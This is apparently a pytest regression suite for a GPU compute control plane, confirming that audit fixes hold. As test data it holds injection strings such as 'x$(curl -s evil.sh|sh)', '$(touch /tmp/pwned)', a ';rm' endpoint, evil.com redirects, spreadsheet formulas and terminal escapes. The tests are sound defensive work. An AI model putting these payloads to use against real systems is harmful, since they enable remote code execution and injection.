"""Regression tests for the input-handling and trust-boundary audit (H1-H4, M1-M4, M6, M7, L1-L5).

Each test asserts the safe behaviour; against the code before the fixes, each one fails.
"""

from __future__ import annotations

import json

import pytest
from conftest import MutableClock
from fastapi.testclient import TestClient
from sqlalchemy import select
from test_cloud import CSRF, login, make, workspace
from test_compute import ADMIN, GB, IMAGE, FakeNode, World

from meridian_control.compute import MASKED
from meridian_control.compute_web import _csv_cell
from meridian_control.models import JobReplica, MarketOffer, ObservationRow, Rental
from meridian_control.security import safe_next
from meridian_control.validation import MAX_REPLICA_SPEC_BYTES, render


@pytest.fixture
def clock():
    return MutableClock()


@pytest.fixture
def client(tmp_path, clock):
    return make(tmp_path, clock, admin_emails=(ADMIN,))


@pytest.fixture
def world(client, tmp_path, clock):
    return World(client, tmp_path, clock)


def good_capacity(node: FakeNode, **over) -> dict:
    return {"jobs_enabled": True, "free_devices": list(node.devices), "advertise_host": node.host,
            "allocatable_vram_bytes": {d: node.vram for d in node.devices}, "job_port_range": [9000, 9004], **over}


def heartbeat(node: FakeNode, gpus: list | None = None):
    node.seq += 1
    return node.c.post(f"/control/v1/nodes/{node.node_id}/heartbeat", json={
        "agent_session_id": "s1", "fencing_epoch": node.epoch, "sequence": node.seq, "gpus": gpus or []})


def observe(node: FakeNode, capacity: dict, jobs: list | None = None, engines: list | None = None):
    assert heartbeat(node).status_code == 200
    return node.c.post(f"/control/v1/nodes/{node.node_id}/observations", json={
        "node_id": node.node_id, "sequence": node.seq, "engines": engines or [], "jobs": jobs or [],
        "capacity": capacity})


def stored(client, node_id: str) -> dict:
    with client.app.state.compute._sf() as s:
        return s.get(ObservationRow, node_id).observation


def corrupt(client, node_id: str, capacity: dict) -> None:
    """Write a malformed observation straight to the database, as one stored before validation existed."""
    with client.app.state.compute._sf() as s:
        row = s.get(ObservationRow, node_id)
        row.observation = {**row.observation, "capacity": capacity}
        s.commit()


def rental_row(client) -> Rental:
    with client.app.state.compute._sf() as s:
        return s.scalars(select(Rental)).one()


BAD_CAPACITIES = [
    {"job_port_range": ["x", 1]},
    {"job_port_range": [0, 10**12]},
    {"job_port_range": [9000]},
    {"free_devices": [["x"]]},
    {"free_devices": ["GPU-" + str(i) for i in range(65)]},
    {"allocatable_vram_bytes": {"GPU-0": "lots"}},
    {"allocatable_vram_bytes": {"GPU-0": -1}},
    {"allocatable_vram_bytes": {"x y": 1}},
    {"advertise_host": "h" * 4000},
    {"advertise_host": "x$(curl -s evil.sh|sh)"},
    {"advertise_host": "{{service_token}}"},
    {"jobs_enabled": "true"},
]


# ── H1: node reports are validated where they are stored ──────────────────


@pytest.mark.parametrize("bad", BAD_CAPACITIES, ids=lambda b: json.dumps(b)[:40])
def test_h1_malformed_capacity_is_rejected_and_nothing_is_stored(client, tmp_path, clock, bad):
    owner = login(client, tmp_path, "own@lab.in", clock)
    node = FakeNode(client.app, owner, workspace(owner, "Lab"))
    before = stored(client, node.node_id)
    r = observe(node, good_capacity(node, **bad))
    assert r.status_code == 400 and r.json()["error"]["code"] == "INVALID_REQUEST", r.text
    assert stored(client, node.node_id) == before


@pytest.mark.parametrize("item", [
    {"job_id": ["x"], "replica": 0, "phase": "Running"},
    {"job_id": "j", "replica": "0", "phase": "Running"},
    {"job_id": "j", "replica": 0, "phase": "Hacked"},
    {"job_id": "j", "replica": 0, "phase": "Running", "started_at": "9" * 500},
])
def test_h1_malformed_job_report_is_rejected(client, tmp_path, clock, item):
    owner = login(client, tmp_path, "own@lab.in", clock)
    node = FakeNode(client.app, owner, workspace(owner, "Lab"))
    assert observe(node, good_capacity(node), jobs=[item]).status_code == 400


def test_h1_malformed_heartbeat_is_rejected(client, tmp_path, clock):
    owner = login(client, tmp_path, "own@lab.in", clock)
    node = FakeNode(client.app, owner, workspace(owner, "Lab"))
    assert heartbeat(node, gpus=[{"device_id": ["x"]}]).status_code == 400
    assert heartbeat(node, gpus=[{"device_id": f"GPU-{i}"} for i in range(65)]).status_code == 400
    assert heartbeat(node, gpus=[{"device_id": "GPU-0", "memory_total_bytes": "80GB"}]).status_code == 400
    r = node.c.post(f"/control/v1/nodes/{node.node_id}/heartbeat", json={"sequence": 99})
    assert r.status_code == 400 and r.json()["error"]["code"] == "INVALID_REQUEST"


def test_h1_unknown_fields_are_dropped_and_ranges_normalised(client, tmp_path, clock):
    """A newer agent's extra fields are accepted but never stored; a wide port range is clamped."""
    owner = login(client, tmp_path, "own@lab.in", clock)
    node = FakeNode(client.app, owner, workspace(owner, "Lab"))
    r = observe(node, good_capacity(node, job_port_range=[20000, 60000], future_field={"x": 1}))
    assert r.status_code == 200, r.text
    cap = stored(client, node.node_id)["capacity"]
    assert cap["job_port_range"] == [20000, 21024] and "future_field" not in cap


def test_h1_a_bad_stored_row_never_stops_billing_or_the_marketplace(client, tmp_path, clock, world):
    world.rent()
    attacker = login(client, tmp_path, "evil@x.io", clock)
    aws = workspace(attacker, "Evil")
    evil = FakeNode(client.app, attacker, aws)
    assert attacker.post(f"/api/w/{aws}/jobs", headers=CSRF, json={"image": IMAGE, "gpus_per_replica": 1}).is_success
    billed = []
    for _ in range(4):
        clock.advance(900)
        world.node.sync()
        assert heartbeat(evil).status_code == 200  # keep the attacker's lease alive
        corrupt(client, evil.node_id, {"jobs_enabled": True, "job_port_range": ["x", 1], "free_devices": [["x"]]})
        client.app.state.compute.tick()
        billed.append(rental_row(client).billed_paise)
    assert billed == sorted(billed) and billed[-1] > billed[0] > 0  # the victim's rental is metered every pass

    # The listed node's own row goes bad: the feed, the marketplace and node detail still answer.
    corrupt(client, world.node.node_id, {"jobs_enabled": True, "free_devices": [["x"]],
                                         "allocatable_vram_bytes": {"GPU": "x"}})
    client.app.state.compute._public_feed = None
    assert TestClient(client.app).get("/api/public/offers").status_code == 200
    assert world.consumer.get(f"/api/w/{world.cws}/market/offers").status_code == 200
    assert world.provider.get(f"/api/w/{world.pws}/nodes/{world.node.node_id}").status_code == 200
    assert world.provider.get(f"/api/w/{world.pws}/nodes").status_code == 200


def test_h1_one_failing_job_never_stops_the_tick(client, tmp_path, clock, world, monkeypatch):
    world.rent()
    owner = login(client, tmp_path, "own@lab.in", clock)
    ws = workspace(owner, "Lab")
    bad = owner.post(f"/api/w/{ws}/jobs", headers=CSRF, json={"image": IMAGE}).json()  # queued: no node yet
    good = owner.post(f"/api/w/{ws}/jobs", headers=CSRF, json={"image": IMAGE}).json()
    compute = client.app.state.compute
    place = compute._place

    def flaky(s, job, now):
        if job.id == bad["id"]:
            raise RuntimeError("boom")
        return place(s, job, now)

    monkeypatch.setattr(compute, "_place", flaky)
    node = FakeNode(client.app, owner, ws)
    clock.advance(900)
    node.sync()
    world.node.sync()
    compute.tick()
    assert rental_row(client).billed_paise > 0
    assert owner.get(f"/api/w/{ws}/jobs/{good['id']}").json()["status"] in ("scheduled", "running")
    assert owner.get(f"/api/w/{ws}/jobs/{bad['id']}").json()["status"] == "queued"


# ── H2: placeholder expansion is bounded and single-pass ──────────────────


def test_h2_placeholder_amplification_is_refused_at_submit(client, tmp_path, clock):
    owner = login(client, tmp_path, "own@lab.in", clock)
    ws = workspace(owner, "Lab")
    r = owner.post(f"/api/w/{ws}/jobs", headers=CSRF, json={
        "image": IMAGE, "gpus_per_replica": 0, "replicas": 8, "args": ["{{peers}}" * 910] * 4})
    assert r.status_code == 400 and r.json()["error"]["code"] == "TOO_LARGE", r.text
    many = ["{{master}}" * 30] * 200
    r = owner.post(f"/api/w/{ws}/jobs", headers=CSRF, json={"image": IMAGE, "gpus_per_replica": 0, "args": many})
    assert r.status_code == 400 and "per replica" in r.json()["error"]["message"]


def test_h2_rendered_snapshot_stays_bounded_with_a_long_host(client, tmp_path, clock):
    owner = login(client, tmp_path, "own@lab.in", clock)
    ws = workspace(owner, "Lab")
    node = FakeNode(client.app, owner, ws, gpus=0)
    host = ".".join(["h" * 63] * 4)[:253].rstrip(".")
    assert observe(node, good_capacity(node, advertise_host=host, job_port_range=[9000, 9064])).status_code == 200
    r = owner.post(f"/api/w/{ws}/jobs", headers=CSRF, json={
        "image": IMAGE, "gpus_per_replica": 0, "replicas": 8, "args": ["--peers={{peers}}", "--m={{master}}"]})
    assert r.status_code == 201, r.text
    with client.app.state.compute._sf() as s:
        jobs = client.app.state.compute.jobs_for_node(s, node.node_id)
    assert len(jobs) == 8 and all(len(json.dumps(j)) < MAX_REPLICA_SPEC_BYTES for j in jobs)
    assert jobs[0]["args"][1] == f"--m={host}:9000"


def test_h2_placeholders_render_once():
    ctx = {"peers": "{{service_token}}", "service_token": "mst_secret"}
    assert render("{{peers}} {{service_token}} {{unknown}}", ctx) == "{{service_token}} mst_secret {{unknown}}"


@pytest.mark.parametrize("body", [
    {"args": ["x"] * 257},
    {"args": ["x" * 8193]},
    {"env": {f"V{i}": "x" for i in range(65)}},
    {"env": {"A" * 129: "x"}},
    {"env": {"OK": "x" * 8193}},
    {"name": "n" * 121},
    {"replicas": 65, "gpus_per_replica": 0},
])
def test_h2_submit_limits(client, tmp_path, clock, body):
    owner = login(client, tmp_path, "own@lab.in", clock)
    ws = workspace(owner, "Lab")
    r = owner.post(f"/api/w/{ws}/jobs", headers=CSRF, json={"image": IMAGE, **body})
    assert r.status_code == 400, r.text


# ── H3: the control plane's clock decides timeouts and billing ────────────


def test_h3_a_node_cannot_hold_a_timeout_open(world):
    r = world.submit(offer_id=world.offer["id"], gpus_per_replica=1, timeout_seconds=60)
    job_id = r.json()["id"]
    world.node.phases[(job_id, 0)] = {"phase": "Running", "exit_code": None, "log_tail": "",
                                      "started_at": "2099-01-01T00:00:00Z"}
    world.node.sync()
    j = world.consumer.get(f"/api/w/{world.cws}/jobs/{job_id}").json()
    assert j["started_at"] <= world.clock().isoformat().replace("+00:00", "Z")  # clamped to when it was heard
    for _ in range(12):
        world.tick(300)
    j = world.consumer.get(f"/api/w/{world.cws}/jobs/{job_id}").json()
    assert j["status"] == "failed" and "timed out" in j["message"]
    rental = world.consumer.get(f"/api/w/{world.cws}/market/rentals").json()["rentals"][0]
    assert rental["status"] == "ended" and rental["seconds"] <= 300
    assert rental["amount_paise"] < 100_00


def test_h3_a_job_stuck_pending_hits_the_start_deadline(world):
    r = world.submit(offer_id=world.offer["id"], gpus_per_replica=1)  # no timeout at all
    job_id = r.json()["id"]
    world.node.phases[(job_id, 0)] = {"phase": "Pending", "exit_code": None, "log_tail": ""}
    for _ in range(7):
        world.tick(300)
    j = world.consumer.get(f"/api/w/{world.cws}/jobs/{job_id}").json()
    assert j["status"] == "failed" and "did not start" in j["message"]
    rental = world.consumer.get(f"/api/w/{world.cws}/market/rentals").json()["rentals"][0]
    assert rental["status"] == "ended" and rental["seconds"] <= 2100


# ── H4: reserved environment variables ────────────────────────────────────


@pytest.mark.parametrize("name", [
    "NVIDIA_VISIBLE_DEVICES", "NVIDIA_DRIVER_CAPABILITIES", "CUDA_VISIBLE_DEVICES", "NVIDIA_REQUIRE_CUDA",
    "CUDA_MPS_PIPE_DIRECTORY", "MERIDIAN_SERVICE_TOKEN", "MERIDIAN_JOB_RANK",
])
def test_h4_reserved_env_is_refused(client, tmp_path, clock, name):
    owner = login(client, tmp_path, "own@lab.in", clock)
    ws = workspace(owner, "Lab")
    body = {"image": IMAGE, "gpus_per_replica": 0, "env": {name: "all"}}
    r = owner.post(f"/api/w/{ws}/jobs", headers=CSRF, json=body)
    assert r.status_code == 400 and r.json()["error"]["code"] == "RESERVED_ENV", r.text


@pytest.mark.parametrize("name", ["1X", "A-B", "A B", "A=B", "-e", ""])
def test_h4_env_names_follow_a_strict_pattern(client, tmp_path, clock, name):
    owner = login(client, tmp_path, "own@lab.in", clock)
    ws = workspace(owner, "Lab")
    assert owner.post(f"/api/w/{ws}/jobs", headers=CSRF, json={"image": IMAGE, "env": {name: "x"}}).status_code == 400
    ok = owner.post(f"/api/w/{ws}/jobs", headers=CSRF, json={"image": IMAGE, "env": {"NVIDIA_TF32_OVERRIDE": "0"}})
    assert ok.status_code == 201


# ── M1 and the env masking rule: credentials are for operators and up ─────


@pytest.fixture
def lab(client, tmp_path, clock):
    owner = login(client, tmp_path, "own@lab.in", clock)
    ws = workspace(owner, "Lab")
    node = FakeNode(client.app, owner, ws)
    r = owner.post(f"/api/w/{ws}/jobs", headers=CSRF, json={"template": "jupyterlab", "env": {"HF_TOKEN": "hf_s3cret"}})
    assert r.status_code == 201, r.text
    node.sync()
    assert owner.post(f"/api/w/{ws}/invitations", headers=CSRF, json={"email": "v@lab.in", "role": "viewer"}).is_success
    viewer = login(client, tmp_path, "v@lab.in", clock)
    return owner, viewer, ws, node, r.json()


def test_m1_viewer_node_detail_has_no_token_or_env_values(lab):
    owner, viewer, ws, node, job = lab
    token = job["service"]["token"]
    seen = json.dumps(viewer.get(f"/api/w/{ws}/nodes/{node.node_id}").json())
    assert token not in seen and "hf_s3cret" not in seen
    assert "HF_TOKEN" in seen and MASKED in seen  # the names stay visible
    full = json.dumps(owner.get(f"/api/w/{ws}/nodes/{node.node_id}").json())
    assert token in full and "hf_s3cret" in full  # an operator still sees what runs


def test_viewer_job_detail_masks_env_values(lab):
    owner, viewer, ws, _node, job = lab
    v = viewer.get(f"/api/w/{ws}/jobs/{job['id']}").json()
    assert v["env"] == {"HF_TOKEN": MASKED} and v["service"]["token"] is None
    assert owner.get(f"/api/w/{ws}/jobs/{job['id']}").json()["env"] == {"HF_TOKEN": "hf_s3cret"}


def test_viewer_jobs_list_carries_no_env_values(lab):
    _owner, viewer, ws, _node, _job = lab
    r = viewer.get(f"/api/w/{ws}/jobs")
    assert r.status_code == 200 and "hf_s3cret" not in r.text and "mst_" not in r.text


def test_viewer_usage_csv_carries_no_env_values(lab):
    _owner, viewer, ws, _node, _job = lab
    r = viewer.get(f"/api/w/{ws}/usage?format=csv")
    assert r.status_code == 200 and "hf_s3cret" not in r.text and "mst_" not in r.text


def test_api_key_viewer_gets_masked_env(lab, client):
    owner, _viewer, ws, _node, job = lab
    key = owner.post(f"/api/w/{ws}/api-keys", headers=CSRF, json={"name": "ro", "role": "viewer"}).json()["token"]
    k = TestClient(client.app)
    seen = k.get(f"/api/w/{ws}/jobs/{job['id']}", headers={"Authorization": f"Bearer {key}"}).json()
    assert seen["env"] == {"HF_TOKEN": MASKED}


# ── M2: API keys act for their creator ────────────────────────────────────


@pytest.fixture
def keyed(client, tmp_path, clock):
    owner = login(client, tmp_path, "own@lab.in", clock)
    ws = workspace(owner, "Lab")
    assert owner.post(f"/api/w/{ws}/invitations", headers=CSRF, json={"email": "a@lab.in", "role": "admin"}).is_success
    adm = login(client, tmp_path, "a@lab.in", clock)
    key = adm.post(f"/api/w/{ws}/api-keys", headers=CSRF, json={"name": "ci", "role": "admin"}).json()["token"]
    uid = [m for m in owner.get(f"/api/w/{ws}/members").json()["members"] if m["email"] == "a@lab.in"][0]["id"]
    return owner, ws, uid, TestClient(client.app), {"Authorization": f"Bearer {key}"}


def test_m2_removing_the_creator_disables_the_key(keyed):
    owner, ws, uid, k, h = keyed
    assert k.get(f"/api/w/{ws}/billing", headers=h).status_code == 200
    assert owner.delete(f"/api/w/{ws}/members/{uid}", headers=CSRF).is_success
    assert k.get(f"/api/w/{ws}/billing", headers=h).status_code == 401
    assert k.post(f"/api/w/{ws}/api-keys", headers=h, json={"name": "persist", "role": "admin"}).status_code == 401


def test_m2_demoting_the_creator_caps_the_key(keyed):
    owner, ws, uid, k, h = keyed
    assert owner.patch(f"/api/w/{ws}/members/{uid}", headers=CSRF, json={"role": "viewer"}).is_success
    assert k.get(f"/api/w/{ws}/jobs", headers=h).status_code == 200  # still a viewer
    assert k.post(f"/api/w/{ws}/api-keys", headers=h, json={"name": "x", "role": "admin"}).status_code == 403
    assert k.post(f"/api/w/{ws}/jobs", headers=h, json={"image": IMAGE}).status_code == 403
    assert owner.patch(f"/api/w/{ws}/members/{uid}", headers=CSRF, json={"role": "operator"}).is_success
    assert k.post(f"/api/w/{ws}/jobs", headers=h, json={"image": IMAGE}).status_code == 201
    assert k.get(f"/api/w/{ws}/billing", headers=h).status_code == 200
    assert k.post(f"/api/w/{ws}/api-keys", headers=h, json={"name": "x", "role": "operator"}).status_code == 403


def test_m2_a_key_cannot_mint_above_its_callers_role(client, keyed):
    compute = client.app.state.compute
    _owner, ws, _uid, _k, _h = keyed
    from meridian_control.service import ControlServiceError

    with pytest.raises(ControlServiceError) as e:
        compute.create_api_key(ws, "a@lab.in", {"name": "x", "role": "admin"}, caller_role="operator")
    assert e.value.http_status == 403


# ── M3: endpoints a node reports are rebuilt from validated parts ─────────


def test_m3_job_endpoint_is_built_by_the_control_plane(world):
    job_id = world.submit(offer_id=world.offer["id"], kind="service").json()["id"]
    world.node.sync()
    hostile = 'http://x$(curl -s evil.sh|sh)\n  - name: injected\n    url: http://evil'
    r = observe(world.node, good_capacity(world.node, free_devices=[]), jobs=[
        {"job_id": job_id, "replica": 0, "phase": "Running", "endpoint": hostile}])
    assert r.status_code == 200, r.text
    j = world.consumer.get(f"/api/w/{world.cws}/jobs/{job_id}").json()
    assert j["service"]["endpoint"] == "http://10.0.0.5:9000"

    # A row stored before this check reads back as no endpoint, never as the hostile text.
    with world.app.state.compute._sf() as s:
        s.get(JobReplica, (job_id, 0)).endpoint = hostile
        s.commit()
    j = world.consumer.get(f"/api/w/{world.cws}/jobs/{job_id}").json()
    assert j["service"]["endpoint"] == "" and j["placements"][0]["endpoint"] == ""


def test_m3_engine_endpoints_are_validated_before_the_gateway_sees_them(client, tmp_path, clock):
    owner = login(client, tmp_path, "own@lab.in", clock)
    ws = workspace(owner, "Lab")
    node = FakeNode(client.app, owner, ws)
    engines = [{"engine_id": "good", "phase": "Ready", "endpoint": "https://10.0.0.5:8001", "model": "m"},
               {"engine_id": "bad", "phase": "Ready", "endpoint": "http://x$(id):1/;rm", "model": "m"}]
    assert observe(node, good_capacity(node), engines=engines).status_code == 200
    endpoints = owner.get(f"/api/w/{ws}/projection").json()["endpoints"]
    assert [(e["engine_id"], e["endpoint"]) for e in endpoints] == [("good", "https://10.0.0.5:8001")]


# ── M4: post-sign-in redirects are same-origin paths ──────────────────────


@pytest.mark.parametrize("value", ["/\t/evil.com", "/\n/evil.com", "/\r/evil.com", "/\\evil.com", "//evil.com",
                                   "https://evil.com", "/\x85/evil.com", "ui/x"])
def test_m4_safe_next_refuses_anything_but_a_same_origin_path(value):
    assert safe_next(value) == "/ui/"


def test_m4_safe_next_keeps_real_paths():
    assert safe_next("/oauth/gateway/authorize?state=abc&x=1") == "/oauth/gateway/authorize?state=abc&x=1"
    assert safe_next("/%09/evil.com") == "/%09/evil.com"  # stays percent-encoded: a path on this origin


# ── M6: request body size limits ──────────────────────────────────────────


def test_m6_unauthenticated_routes_have_a_tight_limit(client):
    c = TestClient(client.app)
    r = c.post("/auth/email/start", headers={**CSRF, "content-type": "application/json"}, content=b" " * (2 * 1024**2))
    assert r.status_code == 413 and r.json()["error"]["code"] == "TOO_LARGE"

    def chunks():  # no Content-Length: counted as it streams in
        for _ in range(20):
            yield b" " * 8192

    r = c.post("/auth/email/start", headers={**CSRF, "content-type": "application/json"}, content=chunks())
    assert r.status_code == 413
    assert c.post("/auth/email/start", headers=CSRF, json={"email": "a@b.io"}).status_code == 202


def test_m6_signed_in_and_node_routes_are_limited(client, tmp_path, clock):
    owner = login(client, tmp_path, "own@lab.in", clock)
    ws = workspace(owner, "Lab")
    node = FakeNode(client.app, owner, ws)
    big = {"image": IMAGE, "args": ["x" * 8000] * 200}
    assert owner.post(f"/api/w/{ws}/jobs", headers=CSRF, json=big).status_code == 413
    r = node.c.post(f"/control/v1/nodes/{node.node_id}/observations", content=b" " * (5 * 1024**2),
                    headers={"content-type": "application/json"})
    assert r.status_code == 413


# ── M7: self-reported hardware is bounded, and fixed for a rental's life ──


def test_m7_a_provider_cannot_inflate_a_running_rental(world):
    rental = world.rent()
    assert rental["gpu_count"] == 2
    extra = [f"GPU-extra-{i}" for i in range(6)]
    world.node.devices += extra  # the node now claims 8 GPUs
    world.tick(3600)
    rental = world.consumer.get(f"/api/w/{world.cws}/market/rentals").json()["rentals"][0]
    assert rental["gpu_count"] == 2 and rental["amount_paise"] == 2 * 100_00 + 4_00  # an hour of 2 GPUs, fee in
    offer = world.provider.get(f"/api/w/{world.pws}/market/offers?mine=true").json()["offers"][0]
    assert offer["gpu_count"] == 2
    # And no node may claim more than 64 devices or an impossible amount of VRAM.
    many = [{"device_id": f"GPU-{i}", "memory_total_bytes": 80 * GB} for i in range(65)]
    assert heartbeat(world.node, gpus=many).status_code == 400
    assert heartbeat(world.node, gpus=[{"device_id": "GPU-0", "memory_total_bytes": 10**18}]).status_code == 400


# ── L1-L4: CSV cells, terminal output, free text ──────────────────────────


@pytest.mark.parametrize("value", ['\t=HYPERLINK("http://x")', "\r=1+1", "\n=1", "=1", "+1", "-1", "@SUM(A1)"])
def test_l1_csv_cells_that_a_spreadsheet_would_run_are_defused(value):
    assert _csv_cell(value) == "'" + value


BAD_TEXT = ["\x1b[2J", "two\nlines", "‮evil", "nul\x00"]


@pytest.mark.parametrize("text", BAD_TEXT, ids=repr)
def test_l4_free_text_rejects_control_characters(client, tmp_path, clock, world, text):
    owner = login(client, tmp_path, "own@lab.in", clock)
    ws = workspace(owner, "Lab")
    uid = owner.get("/api/me").json()["user"]["id"]
    checks = [
        owner.post("/api/workspaces", headers=CSRF, json={"name": f"ws {text}"}),
        owner.patch(f"/api/w/{ws}", headers=CSRF, json={"name": f"ws {text}"}),
        owner.patch("/api/me", headers=CSRF, json={"name": f"me {text}"}),
        owner.post(f"/api/w/{ws}/jobs", headers=CSRF, json={"image": IMAGE, "name": f"job {text}"}),
        owner.post(f"/api/w/{ws}/api-keys", headers=CSRF, json={"name": f"key {text}"}),
        owner.post(f"/api/w/{ws}/gateway-tokens", headers=CSRF, json={"name": f"gw {text}"}),
        owner.patch(f"/api/w/{ws}/members/{uid}/compute", headers=CSRF, json={"group": f"g {text}"}),
        world.provider.patch(f"/api/w/{world.pws}/market/offers/{world.offer['id']}", headers=CSRF,
                             json={"title": f"title {text}"}),
        world.provider.patch(f"/api/w/{world.pws}/market/offers/{world.offer['id']}", headers=CSRF,
                             json={"region": f"region {text}"}),
    ]
    assert [r.status_code for r in checks] == [400] * len(checks), [r.text for r in checks]


def test_l2_cli_strips_terminal_escapes_from_server_and_node_text(world, monkeypatch):
    from meridian.cli.compute import main

    with world.app.state.compute._sf() as s:  # a title stored before free text was validated
        s.scalars(select(MarketOffer)).one().title = "x\x1b]52;c;ZXZpbA==\x07\x1b[2J"
        s.commit()
    job_id = world.submit(offer_id=world.offer["id"]).json()["id"]
    world.node.sync()
    world.node.finish(job_id, logs="done\x1b[2J\x1b]0;pwned\x07‮")
    key = world.consumer.post(f"/api/w/{world.cws}/api-keys", headers=CSRF, json={"name": "cli", "role": "viewer"})
    monkeypatch.setenv("MERIDIAN_WORKSPACE", world.cws)
    monkeypatch.setenv("MERIDIAN_API_KEY", key.json()["token"])
    lines: list[str] = []
    assert main(["offers"], client=TestClient(world.app), out=lines.append) == 0
    assert main(["logs", job_id], client=TestClient(world.app), out=lines.append) == 0
    printed = "\n".join(lines)
    assert "done" in printed and not any(c in printed for c in "\x1b\x07‮")


# ── L3: the public feed names no provider ─────────────────────────────────


def test_l3_public_feed_has_no_provider_name(world):
    feed = TestClient(world.app).get("/api/public/offers").json()
    assert feed["offers"] and all("provider_name" not in o for o in feed["offers"])
    assert "Mumbai DC" not in json.dumps(feed)


# ── L5: the gateway token file that sh sources ────────────────────────────


def test_l5_gateway_token_cannot_inject_shell(tmp_path, monkeypatch):
    from meridian.cli import init as init_mod

    monkeypatch.setenv("MERIDIAN_CLOUD_TOKEN", "mgw_" + "a" * 30 + "$(touch /tmp/pwned)")
    with pytest.raises(SystemExit, match="mgw_"):
        init_mod.main(["--yes", "--dir", str(tmp_path / "m"), "--no-start", "--cloud", "https://c"])


def test_i8_dev_outbox_file_names_carry_no_path_characters(tmp_path):
    from meridian_control.mailer import ConsoleMailer

    ConsoleMailer(str(tmp_path)).send("a/../../b@lab.in", "s", "t", "<p>t</p>")
    [f] = list(tmp_path.iterdir())
    assert f.parent == tmp_path and "/" not in f.name and f.name.endswith("-a_.._.._b_at_lab.in.json")


@pytest.mark.parametrize("path,body", [
    ("tokens", {"ttl_seconds": "abc"}), ("tokens", {"ttl_seconds": 3600.5}), ("tokens", {"ttl_seconds": True}),
    ("place", {"required_vram_bytes": "x"}), ("place", {"count": "2"}), ("place", {"count": None}),
])
def test_i7_non_integer_fields_are_400_not_500(client, tmp_path, clock, path, body):
    owner = login(client, tmp_path, "own@lab.in", clock)
    ws = workspace(owner, "Lab")
    r = owner.post(f"/api/w/{ws}/{path}", headers=CSRF, json=body)
    assert r.status_code == 400, r.text
